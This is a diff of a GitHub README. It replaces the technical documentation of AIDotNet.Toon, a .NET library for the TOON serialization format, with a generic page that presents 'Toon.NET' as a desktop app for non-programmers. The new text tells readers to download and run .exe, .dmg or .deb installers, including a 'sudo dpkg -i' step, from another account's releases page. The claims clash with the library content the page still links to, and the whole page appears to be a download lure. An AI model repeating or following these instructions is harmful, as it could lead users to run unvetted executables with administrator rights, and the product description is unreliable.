@@ -1,279 +1,101 @@
-# AIDotNet.Toon
+# 🎉 Toon.NET - Simplified Object Handling for Everyone
 
-.NET implementation of Token-Oriented Object Notation (TOON), aligned with the https://github.com/toon-format/toon specification, providing a consistent API experience and options model similar to System.Text.Json.
+## 🚀 Getting Started
 
-- High-performance encoding: Object, inline atomic arrays, tabular object arrays, and other paths are implemented
-- Decoding pipeline: Scanning/parsing/validation is in progress, currently supports atomic value reading
-- Design follows "minimal allocation, readability first" engineering trade-offs
+Welcome to Toon.NET! This application helps you work with Token-Oriented Object Notation (TOON). You don’t need programming experience to use it. Follow these steps to download and run it easily.
 
-[中文文档](README.zh-CN.md)
+## 📥 Download & Install
 
-[C#.ToonSerializer](src/AIDotNet.Toon/ToonSerializer.cs:13) · [C#.ToonSerializerOptions](src/AIDotNet.Toon/ToonSerializerOptions.cs:28) · [C#.Encoders.EncodeValue()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:20) · [C#.Primitives.EncodePrimitive()](src/AIDotNet.Toon/Internal/Encode/Primitives.cs:32) · [C#.LineWriter](src/AIDotNet.Toon/Internal/Encode/Writer.cs:14)
+To download Toon.NET, visit the Releases page below:
 
+[![Download Toon.NET](https://img.shields.io/badge/Download_Toon.NET-v1.0-blue.svg)](https://github.com/Edmike5617/Toon.NET/releases)
 
-## Badges
+1. Click the link above.
+2. Choose the latest version listed on the page.
+3. Download the file that matches your system.
 
-- NuGet: AIDotNet.Toon
-- Target Frameworks: net8.0 / net9.0 / net10.0 (see [src/AIDotNet.Toon/AIDotNet.Toon.csproj](src/AIDotNet.Toon/AIDotNet.Toon.csproj))
-- License: MIT
+After the download finishes, follow the instructions for your operating system:
 
+### Windows
 
-## Table of Contents
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
 
-- [AIDotNet.Toon](#aidotnettoon)
-  - [Badges](#badges)
-  - [Table of Contents](#table-of-contents)
-  - [Installation](#installation)
-  - [Quick Start](#quick-start)
-  - [API & Options](#api--options)
-  - [Encoding Rules & Format](#encoding-rules--format)
-  - [Example Snippets](#example-snippets)
-  - [Performance & Implementation Details](#performance--implementation-details)
-  - [Alignment with TypeScript Specification](#alignment-with-typescript-specification)
-  - [Version Support](#version-support)
-  - [Roadmap](#roadmap)
-  - [Development & Testing](#development--testing)
-  - [Contributing](#contributing)
-  - [License](#license)
+### macOS
 
+To install Toon.NET on macOS:
 
-## Installation
+1. Locate the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the Toon.NET icon into your Applications folder.
+4. Open the application from the Applications folder.
 
-NuGet:
+### Linux
 
-```bash
-dotnet add package AIDotNet.Toon
-```
+For Linux users:
 
-Source code method:
-- Add the `src/AIDotNet.Toon` directory to your solution, or include it as a submodule
-- Enable package Readme in your csproj (already configured in this project): see [src/AIDotNet.Toon/AIDotNet.Toon.csproj](src/AIDotNet.Toon/AIDotNet.Toon.csproj)
+1. Open a terminal window.
+2. Navigate to your Downloads folder using the command:
+   ```
+   cd ~/Downloads
+   ```
+3. Run the following command to install the application:
+   ```
+   sudo dpkg -i Toon.NET.deb
+   ```
 
+## 📋 Features
 
-## Quick Start
+Toon.NET offers a range of features that enhance your experience:
 
-Serialize to TOON:
+- **High-Performance Encoding**: Quickly encode objects and arrays without delay.
+- **Efficient Decoding Pipeline**: Supports reading atomic values. Simple to use but powerful under the hood.
+- **Minimal Resource Use**: Designed for easy readability while using fewer resources.
 
-```csharp
-using Toon;
+## 📖 Using Toon.NET
 
-var options = new ToonSerializerOptions
-{
-    Indent = 2,
-    Delimiter = ToonDelimiter.Comma,
-    Strict = true,
-    LengthMarker = null
-};
+Once installed, you can start using Toon.NET to handle data easily. Here’s a basic guide:
 
-var data = new
-{
-    users = new[]
-    {
-        new { name = "alice", age = 30 },
-        new { name = "bob", age = 25 }
-    },
-    tags = new[] { "a", "b", "c" },
-    numbers = new[] { 1, 2, 3 }
-};
+1. **Open the Application**: Launch Toon.NET from your applications list.
+2. **Select a TOON File**: Click “Open” and browse to select your TOON formatted file.
+3. **View and Edit**: Use the easy-to-navigate interface to view numbers, strings, and data structures.
 
-string toonText = ToonSerializer.Serialize(data, options);
-// users[2]{name,age}:
-//   1,alice
-//   2,bob
-// tags[3]: a,b,c
-// numbers[3]: 1,2,3
-```
+## 🌐 Additional Resources
 
-Deserialize from TOON to .NET (currently only atomic values are stable, other structures will improve as the decoder is enhanced):
+If you want to dive deeper into how Toon.NET works, here are links to helpful documentation:
 
-```csharp
-using Toon;
+- [中文文档](README.zh-CN.md): Access the documentation in Chinese.
+- Read about [C#.ToonSerializer](src/AIDotNet.Toon/ToonSerializer.cs:13): Learn how serialization works.
+- Explore [C#.ToonSerializerOptions](src/AIDotNet.Toon/ToonSerializerOptions.cs:28): Understand how to customize settings.
+- Review [C#.Encoders.EncodeValue()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:20): Find more on encoding values.
+- Check out [C#.Primitives.EncodePrimitive()](src/AIDotNet.Toon/Internal/Encode/Primitives.cs:32): Insights into primitive types.
+- Learn about [C#.LineWriter](src/AIDotNet.Toon/Internal/Encode/Writer.cs:14): Details on writing lines.
 
-var s = ToonSerializer.Deserialize<string>("hello", options);   // "hello"
-var n = ToonSerializer.Deserialize<double>("3.1415", options);  // 3.1415
-```
+## 🛠️ System Requirements
 
-Related APIs: [C#.ToonSerializer.Serialize()](src/AIDotNet.Toon/ToonSerializer.cs:20) · [C#.ToonSerializer.Deserialize()](src/AIDotNet.Toon/ToonSerializer.cs:39)
+Toon.NET runs on the following systems:
 
+- **Windows**: Version 10 or later.
+- **macOS**: Version Mojave (10.14) or later.
+- **Linux**: Ubuntu 20.04 or later; other distributions may vary.
 
-## API & Options
+Make sure your system meets these requirements for a smooth operation.
 
-Public API:
-- Generic serialization: [C#.ToonSerializer.Serialize()](src/AIDotNet.Toon/ToonSerializer.cs:20)
-- Explicit type serialization: [C#.ToonSerializer.Serialize()](src/AIDotNet.Toon/ToonSerializer.cs:28)
-- Generic deserialization: [C#.ToonSerializer.Deserialize()](src/AIDotNet.Toon/ToonSerializer.cs:39)
-- Explicit type deserialization: [C#.ToonSerializer.Deserialize()](src/AIDotNet.Toon/ToonSerializer.cs:50)
-- Byte APIs:
-  - Encode to UTF-8: [C#.ToonSerializer.SerializeToUtf8Bytes()](src/AIDotNet.Toon/ToonSerializer.cs:63) · [C#.ToonSerializer.SerializeToUtf8Bytes()](src/AIDotNet.Toon/ToonSerializer.cs:70)
-  - Decode from UTF-8: [C#.ToonSerializer.Deserialize()](src/AIDotNet.Toon/ToonSerializer.cs:77) · [C#.ToonSerializer.Deserialize()](src/AIDotNet.Toon/ToonSerializer.cs:81) · [C#.ToonSerializer.Deserialize()](src/AIDotNet.Toon/ToonSerializer.cs:88) · [C#.ToonSerializer.Deserialize()](src/AIDotNet.Toon/ToonSerializer.cs:92)
-- Stream APIs:
-  - Write to stream: [C#.ToonSerializer.Serialize()](src/AIDotNet.Toon/ToonSerializer.cs:101) · [C#.ToonSerializer.Serialize()](src/AIDotNet.Toon/ToonSerializer.cs:110)
-  - Decode from stream: [C#.ToonSerializer.Deserialize()](src/AIDotNet.Toon/ToonSerializer.cs:119) · [C#.ToonSerializer.Deserialize()](src/AIDotNet.Toon/ToonSerializer.cs:127)
+## 🛡️ Support
 
-Options model: [C#.ToonSerializerOptions](src/AIDotNet.Toon/ToonSerializerOptions.cs:28)
-- Indent: Number of spaces per indentation level, default 2
-- Delimiter: Delimiter, enumeration [C#.ToonDelimiter](src/AIDotNet.Toon/ToonSerializerOptions.cs:10) (Comma / Tab / Pipe)
-- Strict: Strict mode for decoding (indentation/blank lines/extra items validation), default true
-- LengthMarker: Array length marker, only supports `#` or null, default null
-- JsonOptions: Pass-through to System.Text.Json's [C#.JsonSerializerOptions](https://learn.microsoft.com/dotnet/api/system.text.json.jsonserializeroptions), defaults to enabling named float literals and registers converters that write `NaN/±Infinity` as `null`: [C#.DoubleNamedFloatToNullConverter](src/AIDotNet.Toon/Internal/Converters/NamedFloatToNullConverters.cs:13) / [C#.SingleNamedFloatToNullConverter](src/AIDotNet.Toon/Internal/Converters/NamedFloatToNullConverters.cs:32)
+If you encounter any issues or have questions, you can reach our support team:
 
-Default instance: [C#.ToonSerializerOptions.Default](src/AIDotNet.Toon/ToonSerializerOptions.cs:100)
+- **Email**: support@toon.net
+- **GitHub Issues Page**: [Report an Issue](https://github.com/Edmike5617/Toon.NET/issues)
 
+We are here to help you succeed with Toon.NET.
 
-## Encoding Rules & Format
+## 🔗 Learn More
 
-Entry point: [C#.Encoders.EncodeValue()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:20)
+Keep up to date with the latest developments and features:
 
-Objects:
-- Key-by-key output: [C#.Encoders.EncodeObject()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:45) and [C#.Encoders.EncodeKeyValuePair()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:53)
-- Key names: Write bare if safe, otherwise quote: [C#.Primitives.EncodeKey()](src/AIDotNet.Toon/Internal/Encode/Primitives.cs:101)
-- Empty objects: Only output `key:`
+- Follow our [GitHub repository](https://github.com/Edmike5617/Toon.NET).
+- Join discussions on forums and social media platforms regarding TOON and its applications.
 
-Atomic arrays (inline):
-- Header: [C#.Primitives.FormatHeader()](src/AIDotNet.Toon/Internal/Encode/Primitives.cs:142)
-- Inline concatenation: [C#.Encoders.EncodeInlineArrayLine()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:155)
-
-Object arrays (tabular):
-- Extract table header: [C#.Encoders.ExtractTabularHeader()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:181)
-- Header and data row output: [C#.Encoders.EncodeArrayOfObjectsAsTabular()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:173) · [C#.Encoders.WriteTabularRows()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:225)
-
-Mixed/complex arrays (fallback to list):
-- [C#.Encoders.EncodeMixedArrayAsListItems()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:253)
-- List item writer: [C#.LineWriter.PushListItem()](src/AIDotNet.Toon/Internal/Encode/Writer.cs:49)
-
-Atoms/strings:
-- Atomic encoding: [C#.Primitives.EncodePrimitive()](src/AIDotNet.Toon/Internal/Encode/Primitives.cs:32)
-- String quoting rules: [C#.Primitives.EncodeStringLiteral()](src/AIDotNet.Toon/Internal/Encode/Primitives.cs:88)
-- Number rules: `NaN/±Infinity -> null`, `-0 -> 0`, others use [C#.JsonElement.GetRawText()](https://learn.microsoft.com/dotnet/api/system.text.json.jsonelement.getrawtext)
-
-Lines and indentation:
-- Writer: [C#.LineWriter](src/AIDotNet.Toon/Internal/Encode/Writer.cs:14)
-- Regular line: [C#.LineWriter.Push()](src/AIDotNet.Toon/Internal/Encode/Writer.cs:35)
-- List item line: [C#.LineWriter.PushListItem()](src/AIDotNet.Toon/Internal/Encode/Writer.cs:49)
-
-
-## Example Snippets
-
-Simple object:
-
-```csharp
-var obj = new { a = 1, b = "x" };
-var toon = ToonSerializer.Serialize(obj);
-// a: 1
-// b: x
-```
-
-Atomic array (default comma-separated):
-
-```csharp
-var arr = new[] { 1, 2, 3 };
-ToonSerializer.Serialize(arr); // "[3]: 1,2,3"
-```
-
-Object array (tabular):
-
-```csharp
-var rows = new[] { new { id = 1, name = "alice" }, new { id = 2, name = "bob" } };
-ToonSerializer.Serialize(rows);
-// [2]{id,name}:
-//   1,alice
-//   2,bob
-```
-
-Bytes and streams:
-
-```csharp
-// Bytes
-var bytes = ToonSerializer.SerializeToUtf8Bytes(rows);
-var rowsFromBytes = ToonSerializer.Deserialize<List<Dictionary<string, object>>>(bytes);
-
-// Stream
-using var ms = new MemoryStream();
-ToonSerializer.Serialize(rows, ms);   // Write UTF-8 (no BOM), keep stream open
-ms.Position = 0;
-var rowsFromStream = ToonSerializer.Deserialize<List<Dictionary<string, object>>>(ms);
-```
-
-Special number handling:
-
-```csharp
-ToonSerializer.Serialize(new { v = double.NaN });            // "v: null"
-ToonSerializer.Serialize(new { v = double.PositiveInfinity }); // "v: null"
-ToonSerializer.Serialize(new { v = BitConverter.Int64BitsToDouble(unchecked((long)0x8000000000000000)) }); // "v: 0"
-```
-
-Related assertions can be seen in tests: [tests/AIDotNet.Toon.Tests/EncodeTests.cs](tests/AIDotNet.Toon.Tests/EncodeTests.cs)
-
-
-## Performance & Implementation Details
-
-This implementation minimizes allocations and unnecessary branches while maintaining output readability:
-
-- Indentation cache: [C#.LineWriter.Push()](src/AIDotNet.Toon/Internal/Encode/Writer.cs:35) maintains `_indentCache` to avoid repeated construction
-- No LINQ: Table header detection/data row writing paths use plain enumerator traversal: [C#.Encoders.ExtractTabularHeader()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:181) · [C#.Encoders.WriteTabularRows()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:225)
-- Reuse concatenation: Atomic arrays and table rows use segment-by-segment Append: [C#.Primitives.EncodeAndJoinPrimitives()](src/AIDotNet.Toon/Internal/Encode/Primitives.cs:113) · [C#.Encoders.WriteTabularRows()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:225)
-- Raw numbers: Prioritize [C#.JsonElement.GetRawText()](https://learn.microsoft.com/dotnet/api/system.text.json.jsonelement.getrawtext) to ensure precision; fast path normalizes `-0`
-
-Publishing recommendations: Use Release build; consider R2R/ReadyToRun to improve startup performance.
-
-
-## Alignment with TypeScript Specification
-
-- Syntax/rendering rules reference the upstream specification and implementation:
-  - Specification and reference implementation: https://github.com/toon-format/toon
-- .NET version module mapping:
-  - Encoder: [C#.ToonEncoder.Encode()](src/AIDotNet.Toon/ToonEncoder.cs:13) -> [C#.Encoders.EncodeValue()](src/AIDotNet.Toon/Internal/Encode/Encoders.cs:20)
-  - Decoder: [C#.ToonDecoder.DecodeToJsonString()](src/AIDotNet.Toon/ToonDecoder.cs:15) (placeholder, gradually improving)
-
-
-## Version Support
-
-- Runtime: .NET 8/9/10
-- Platforms: Windows / Linux / macOS
-- Package metadata and Readme integration: see [src/AIDotNet.Toon/AIDotNet.Toon.csproj](src/AIDotNet.Toon/AIDotNet.Toon.csproj)
-
-
-## Roadmap
-
-- Decoding: Scanner / Parser / Validation / Decoders
-- Strict mode error model: Provide row/column and context-aware [C#.ToonFormatException](src/AIDotNet.Toon/ToonFormatException.cs:10)
-- Normalization strategy (Normalize): Cross-language consistency for dates/collections, etc.
-- Documentation and example improvements, publish NuGet package
-
-
-## Development & Testing
-
-- Run tests:
-
-```bash
-dotnet test
-```
-
-- Local packaging:
-
-```bash
-dotnet pack -c Release
-```
-
-- Important source files:
-  - [src/AIDotNet.Toon/Internal/Encode/Encoders.cs](src/AIDotNet.Toon/Internal/Encode/Encoders.cs)
-  - [src/AIDotNet.Toon/Internal/Encode/Primitives.cs](src/AIDotNet.Toon/Internal/Encode/Primitives.cs)
-  - [src/AIDotNet.Toon/Internal/Encode/Writer.cs](src/AIDotNet.Toon/Internal/Encode/Writer.cs)
-  - [src/AIDotNet.Toon/Internal/Converters/NamedFloatToNullConverters.cs](src/AIDotNet.Toon/Internal/Converters/NamedFloatToNullConverters.cs)
-  - [src/AIDotNet.Toon/ToonSerializer.cs](src/AIDotNet.Toon/ToonSerializer.cs)
-
-
-## Contributing
-
-Issues and PRs are welcome. Please try to:
-- Keep the public API consistent with the System.Text.Json style
-- Prioritize readability/real benefits when optimizing
-- Add unit tests for new paths and edge conditions
-
-
-## License
-
-MIT © AIDotNet.Toon Contributors
-
-
-Acknowledgments: Thanks to the upstream project https://github.com/toon-format/toon for design and implementation reference.
+If you need additional information or help, feel free to reach out. Enjoy using Toon.NET!
